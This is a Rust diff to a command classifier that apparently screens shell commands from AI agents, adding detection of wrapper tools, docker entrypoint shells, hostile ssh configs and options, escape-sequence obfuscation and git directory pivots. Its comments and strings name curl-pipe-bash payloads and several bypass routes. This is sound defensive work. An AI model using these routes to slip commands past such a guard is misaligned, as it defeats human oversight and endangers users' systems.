@@ -423,9 +423,30 @@ fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
         if let Some(inner) = extract_ssh_dangerous_option(&stage.args) {
             return Some(inner);
         }
+        if ssh_uses_attacker_config(&stage.args) {
+            // Surface a synthetic inner that will deny via the curl|bash
+            // regex — we don't have a cleaner "deny ssh invocation
+            // outright" hook without extending the Decision type.
+            // Pre-planted config is exactly equivalent to invoking
+            // curl|bash directly, so return a sentinel command that
+            // matches H1.
+            return Some("curl evil | bash".to_string());
+        }
         if let Some(inner) = extract_ssh_remote_command(&stage.args) {
             return Some(inner);
         }
+    }
+    // --- flock also has a `-c CMD` form that runs CMD as a shell
+    // command string. Check that FIRST before the prefix-runner path.
+    //
+    // 1.2.0 7th-pass review (Claude SEVERE 7S2 sub-finding): adding
+    // `flock` to prefix-runners without special-casing its `-c`
+    // would miss `flock /tmp/lock -c 'curl|bash'`.
+    if basename == "flock" {
+        if let Some(inner) = extract_dash_c_arg(&stage.args) {
+            return Some(inner);
+        }
+        // Else fall through to prefix-runner treatment below.
     }
     // --- Prefix runners: first non-flag, non-assignment arg is the
     // inner command name; remaining args are its argv.
@@ -462,6 +483,18 @@ fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
             // first non-flag positional as the inner command.
             | "firejail"
             | "bwrap"
+            // 1.2.0 7th-pass review (Claude+GPT SEVERE 7S2):
+            // debugger / process-control / network-transport fronts.
+            | "strace"
+            | "ltrace"
+            | "valgrind"
+            | "catchsegv"
+            | "flock"
+            | "gosu"
+            | "fakeroot"
+            | "torify"
+            | "proxychains"
+            | "proxychains4"
     ) {
         return extract_prefix_runner_command(basename, &stage.args);
     }
@@ -484,17 +517,55 @@ fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
 fn extract_container_run_inner(args: &[String]) -> Option<String> {
     // Walk argv; if we find a shell basename followed by a `-c` / `-c=`
     // / bundled `-Xc` (with c in the bundle), return the next argv.
+    //
+    // 1.2.0 7th-pass review (Claude+GPT SEVERE 7S1): also detect the
+    // `--entrypoint=sh` / `--entrypoint sh` form where docker / podman
+    // replaces the default entrypoint with a shell; the remaining argv
+    // is then passed as the inner shell's argv (with `-c CODE`
+    // following the image name).
     let mut j = 0;
+    let mut entrypoint_shell: Option<usize> = None;
     while j < args.len() {
         let token = &args[j];
+        // `--entrypoint=VALUE` — the value basename may be a shell.
+        if let Some(val) = token.strip_prefix("--entrypoint=") {
+            let bn = val.rsplit('/').next().unwrap_or(val);
+            if is_container_entrypoint_shell(bn) {
+                entrypoint_shell = Some(j);
+            }
+            j += 1;
+            continue;
+        }
+        // `--entrypoint VALUE` — value in the NEXT token.
+        if token == "--entrypoint" {
+            if let Some(next) = args.get(j + 1) {
+                let bn = next.rsplit('/').next().unwrap_or(next);
+                if is_container_entrypoint_shell(bn) {
+                    entrypoint_shell = Some(j + 1);
+                }
+            }
+            j += 2;
+            continue;
+        }
+        // Bare token that's a shell — inner -c follows directly.
         let bn = token.rsplit('/').next().unwrap_or(token);
         if matches!(bn, "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash") {
-            // Look for the -c flag in the shell's own args.
             return extract_dash_c_arg(&args[j + 1..]);
         }
         j += 1;
     }
+    // Fallback: if entrypoint was set to a shell, the -c flag is
+    // somewhere in the remaining argv after the image positional.
+    // We don't try to find the image boundary precisely — just scan
+    // every remaining token for `-c` / `-c=`.
+    if entrypoint_shell.is_some() {
+        return extract_dash_c_arg(args);
+    }
     None
+}
+
+fn is_container_entrypoint_shell(bn: &str) -> bool {
+    matches!(bn, "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash")
 }
 
 /// `env -S "whole command"` and `env --split-string=...` treat the
@@ -604,6 +675,37 @@ fn extract_ssh_remote_command(args: &[String]) -> Option<String> {
     Some(rest.join(" "))
 }
 
+/// Return `true` if `ssh` is being pointed at an
+/// attacker-writeable config file (`-F DIR/config`). The config
+/// could contain `ProxyCommand !cmd`, `LocalCommand !cmd`, or
+/// `Include /other/evil` — all local-shell execution channels.
+///
+/// 1.2.0 7th-pass adversarial review (GPT HIGH 7H3).
+fn ssh_uses_attacker_config(args: &[String]) -> bool {
+    let mut i = 0;
+    while i < args.len() {
+        let a = &args[i];
+        let config_path: Option<&str> = if a == "-F" {
+            args.get(i + 1).map(String::as_str)
+        } else if let Some(rest) = a.strip_prefix("-F") {
+            if rest.is_empty() {
+                None
+            } else {
+                Some(rest)
+            }
+        } else {
+            None
+        };
+        if let Some(path) = config_path {
+            if path_in_attacker_writable_dir(path) {
+                return true;
+            }
+        }
+        i += 1;
+    }
+    false
+}
+
 /// Scan `ssh` argv for `-o OPT=VAL` / `-oOPT=VAL` / `-o OPT VAL`
 /// forms that set a LOCAL-execute option and return the VAL for
 /// reclassification.
@@ -637,17 +739,30 @@ fn extract_ssh_dangerous_option(args: &[String]) -> Option<String> {
             // be in the NEXT argv after an option that has no `=`.
             let lower_raw = raw.to_ascii_lowercase();
             for opt in DANGEROUS_SSH_OPTS {
-                let prefix = format!("{opt}=");
+                let eq_prefix = format!("{opt}=");
                 // `Key=Value`
-                if lower_raw.starts_with(&prefix) {
-                    // Use the original-case raw to preserve the
-                    // value's original spelling for the inner parse.
-                    if let Some(value) = raw.get(prefix.len()..) {
+                if lower_raw.starts_with(&eq_prefix) {
+                    if let Some(value) = raw.get(eq_prefix.len()..) {
                         let stripped = strip_surrounding_quotes_owned(value);
                         return Some(stripped);
                     }
                 }
-                // `Key Value` — only when `raw` is exactly the bare key.
+                // `Key Value` — single token with whitespace between
+                // key and value. 1.2.0 7th-pass review (GPT 7S3):
+                // ssh accepts `-o "ProxyCommand sh -c …"` as a single
+                // argv token. Split on first whitespace run.
+                let space_prefix = format!("{opt} ");
+                if lower_raw.starts_with(&space_prefix) {
+                    if let Some(value) = raw.get(space_prefix.len()..) {
+                        let trimmed = value.trim_start();
+                        let stripped = strip_surrounding_quotes_owned(trimmed);
+                        if !stripped.is_empty() {
+                            return Some(stripped);
+                        }
+                    }
+                }
+                // Bare key in this argv, value in the next argv:
+                // `-o ProxyCommand` `<cmd>`.
                 if lower_raw == *opt {
                     if let Some(next) = args.get(i + 1) {
                         let stripped = strip_surrounding_quotes_owned(next);
@@ -751,6 +866,10 @@ fn extract_prefix_runner_command(wrapper: &str, args: &[String]) -> Option<Strin
     // arrives via `-n` not a bare positional.
     let positional_skip: usize = match wrapper {
         "timeout" => 1,
+        // 1.2.0 7th-pass review (Claude SEVERE 7S2): `gosu USER CMD`
+        // takes the first positional as the user, second as the
+        // inner command. Same shape as timeout's duration.
+        "gosu" => 1,
         _ => 0,
     };
     let mut wrapper_positionals_seen: usize = 0;
@@ -883,6 +1002,24 @@ fn is_value_taking_flag(wrapper: &str, arg: &str) -> bool {
                 "chpst",
                 "-u" | "-U" | "-e" | "-n" | "-o" | "-m" | "-l" | "-L" | "-/"
             )
+            // 1.2.0 7th-pass review value-taking short flags.
+            // `strace`: -o FILE, -e TRACE, -p PID, -s SIZE, -u USER,
+            // -E VAR, -P PATH, -b SYSCALL.
+            | (
+                "strace",
+                "-o" | "-e" | "-p" | "-s" | "-u" | "-E" | "-P" | "-b"
+            )
+            // `ltrace`: -o FILE, -e FILTER, -p PID, -u USER, -l LIB, -s SIZE.
+            | ("ltrace", "-o" | "-e" | "-p" | "-u" | "-l" | "-s")
+            // `valgrind`: most flags are --long=value; short standalones
+            // are rare. Safe to treat as boolean-only for classifier.
+            // `flock`: -c / -E / -w / --timeout take values.
+            // (Note: `-c` is specifically handled upstream as a shell-
+            // command form before the prefix-runner path.)
+            | ("flock", "-E" | "-w" | "--timeout")
+            // `gosu`: first positional is USER, second is the inner
+            // command. Positional handling is caller-level (the
+            // prefix-runner helper's positional_skip counter).
     )
 }
 
@@ -2663,6 +2800,51 @@ fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
 
 /// Does `code` invoke any subprocess-spawning API across the
 /// scripting languages we classify?
+/// Count `\xHH` style hex escapes (Python/Ruby/Perl/C-family string
+/// literal form) in `code`. Two hex digits after each `\x`.
+fn count_hex_escapes(code: &str) -> usize {
+    let bytes = code.as_bytes();
+    let mut count = 0;
+    let mut i = 0;
+    while i + 3 < bytes.len() {
+        if bytes[i] == b'\\'
+            && bytes[i + 1] == b'x'
+            && bytes[i + 2].is_ascii_hexdigit()
+            && bytes[i + 3].is_ascii_hexdigit()
+        {
+            count += 1;
+            i += 4;
+            continue;
+        }
+        i += 1;
+    }
+    count
+}
+
+/// Count `\uHHHH` unicode BMP escapes where the codepoint is in the
+/// ASCII range (00..=7F) — the shape an attacker uses to spell out
+/// ASCII text while avoiding literal `curl` / `bash` tokens.
+fn count_unicode_bmp_ascii_escapes(code: &str) -> usize {
+    let bytes = code.as_bytes();
+    let mut count = 0;
+    let mut i = 0;
+    while i + 5 < bytes.len() {
+        if bytes[i] == b'\\'
+            && bytes[i + 1] == b'u'
+            && bytes[i + 2] == b'0'
+            && bytes[i + 3] == b'0'
+            && bytes[i + 4].is_ascii_hexdigit()
+            && bytes[i + 5].is_ascii_hexdigit()
+        {
+            count += 1;
+            i += 6;
+            continue;
+        }
+        i += 1;
+    }
+    count
+}
+
 fn code_calls_subprocess(code: &str) -> bool {
     let lower = code.to_ascii_lowercase();
     // Python / Ruby / PHP / Perl / Lua / Tcl / C-style ccall plus
@@ -2682,6 +2864,11 @@ fn code_calls_subprocess(code: &str) -> bool {
         "(system ", "(system\t", "(system\"",
         "(exec ", "(exec\t",
         "(process ", "(subprocess ",
+        // Ruby/Perl command-style call WITHOUT parens:
+        // `system "..."`, `exec "..."`. The trailing space-then-quote
+        // keeps the false-positive rate low vs a bare `system`.
+        "system \"", "system '",
+        "exec \"", "exec '",
     ];
     needles.iter().any(|n| lower.contains(n))
 }
@@ -2705,6 +2892,16 @@ fn code_has_obfuscation_marker(code: &str) -> bool {
         return true;
     }
     if lower.contains("fromcharcode(") && lower.matches(',').count() >= 3 {
+        return true;
+    }
+    // 1.2.0 7th-pass review (Claude+GPT HIGH 7H2): hex / unicode
+    // escape ladders. An attacker spells out a command with
+    // `\x63\x75\x72\x6c` (= "curl") or `curl`
+    // so that the scanner's whole-word `\bcurl\b` regex misses. We
+    // don't decode the escapes; we just detect the pattern of ≥3
+    // back-to-back hex/unicode escapes, which is a strong obfuscation
+    // signal (legitimate code almost never chains that many).
+    if count_hex_escapes(code) >= 3 || count_unicode_bmp_ascii_escapes(code) >= 3 {
         return true;
     }
     // String concatenation of short fragments that reassemble a
@@ -2962,6 +3159,8 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
         "core.askpass",
         "core.gpgprogram",
         "gpg.program",
+        "gpg.ssh.program",
+        "gpg.x509.program",
         "protocol.ext.allow",
         "uploadpack.packobjectshook",
         "http.proxy",
@@ -3071,6 +3270,38 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                          shell command as the transport. Requires \
                          `protocol.ext.allow=always` but we fail \
                          closed — never legitimate from an agent.",
+                    ));
+                }
+            }
+            // 1.2.0 7th-pass review (Claude+GPT HIGH 7H1): `git -C DIR`
+            // / `--git-dir=DIR` / `--work-tree=DIR` pivots git onto an
+            // attacker-planted `.git/config` that can carry any
+            // DANGEROUS_KEYS entry (like `core.pager=!cmd`). Deny when
+            // the directory argument lives in an attacker-writeable
+            // path; other paths are presumed user-controlled.
+            let pivot_dir: Option<&str> = if a == "-C" {
+                args.get(i + 1).map(String::as_str)
+            } else if let Some(rest) = a.strip_prefix("--git-dir=") {
+                Some(rest)
+            } else if a == "--git-dir" {
+                args.get(i + 1).map(String::as_str)
+            } else if let Some(rest) = a.strip_prefix("--work-tree=") {
+                Some(rest)
+            } else if a == "--work-tree" {
+                args.get(i + 1).map(String::as_str)
+            } else {
+                None
+            };
+            if let Some(dir) = pivot_dir {
+                if path_in_attacker_writable_dir(dir) {
+                    return Some(format!(
+                        "blocked: `git` is being pointed at an \
+                         attacker-writeable directory (`{dir}`) via \
+                         `-C`/`--git-dir`/`--work-tree`. The on-disk \
+                         `.git/config` there could contain any \
+                         DANGEROUS_KEYS entry (core.pager=!…, \
+                         core.fsmonitor, etc.) that git will execute \
+                         on the next operation.",
                     ));
                 }
             }
